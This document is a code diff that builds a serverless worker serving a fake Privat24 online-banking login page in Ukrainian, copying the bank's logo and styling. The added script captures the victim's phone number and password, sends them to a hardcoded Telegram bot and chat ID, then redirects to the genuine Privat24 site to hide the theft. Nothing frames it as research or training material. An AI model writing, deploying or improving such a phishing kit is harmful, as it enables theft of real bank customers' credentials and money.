@@ -1,22 +1,62 @@
+export default {
+  async fetch(request) {
+    const html = `
 <!DOCTYPE html>
-<html>
+<html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <title>Приват24 — Вхід</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Приват24 — Ваш фінансовий контроль</title>
     <style>
-        body { background: url('https://privatbank.ua/themes/privatbank/assets/img/bg-main.jpg') no-repeat center; background-size: cover; height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; font-family: sans-serif; }
-        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); width: 320px; text-align: center; }
-        .logo { color: #7ab500; font-size: 28px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: #7ab500; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        body { margin: 0; background: #f6f6f6; font-family: 'Open Sans', sans-serif; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; background: #fff; padding: 20px 0; display: flex; justify-content: center; border-bottom: 1px solid #e1e1e1; }
+        .logo { width: 150px; }
+        .card { width: 100%; max-width: 380px; background: #fff; margin-top: 50px; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); text-align: center; }
+        h2 { font-weight: 400; font-size: 22px; margin-bottom: 30px; color: #333; }
+        .input-box { margin-bottom: 20px; position: relative; }
+        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; transition: 0.3s; }
+        input:focus { border-color: #71bb00; outline: none; }
+        .login-btn { width: 100%; padding: 15px; background: #71bb00; color: #fff; border: none; border-radius: 4px; font-size: 18px; font-weight: 600; cursor: pointer; }
+        .login-btn:hover { background: #61a000; }
+        .footer-links { margin-top: 25px; font-size: 14px; color: #71bb00; text-decoration: none; display: block; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">Privat<span>24</span></div>
-        <input type="text" placeholder="Номер телефону">
-        <input type="password" placeholder="Пароль">
-        <button class="btn">Увійти</button>
+<div class="header">
+    <img src="https://next.privat24.ua/static/media/logo.891f9b33.svg" class="logo">
+</div>
+<div class="card">
+    <h2>Вхід у Приват24</h2>
+    <div class="input-box">
+        <input type="text" id="log" placeholder="Номер телефону">
     </div>
+    <div class="input-box">
+        <input type="password" id="pas" placeholder="Пароль">
+    </div>
+    <button class="login-btn" onclick="send()">Увійти</button>
+    <a href="#" class="footer-links">Забули пароль?</a>
+</div>
+
+<script>
+function send() {
+    const l = document.getElementById('log').value;
+    const p = document.getElementById('pas').value;
+    const token = "8790499217:AAFZF8O15FpKe0-z_4P3q9FkedSnGdzB_o8";
+    const chat = "8491881282";
+
+    if(!l || !p) return;
+
+    const text = encodeURIComponent("🏦 PRIVAT24 LOG:\\n👤 Phone: " + l + "\\n🔑 Pass: " + p);
+    const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + text;
+    
+    fetch(url, { mode: 'no-cors' });
+    
+    setTimeout(() => { window.location.href = "https://next.privat24.ua/"; }, 1000);
+}
+</script>
 </body>
 </html>
+`;
+    return new Response(html, { headers: { "content-type": "text/html;charset=UTF-8" } });
+  }
+};
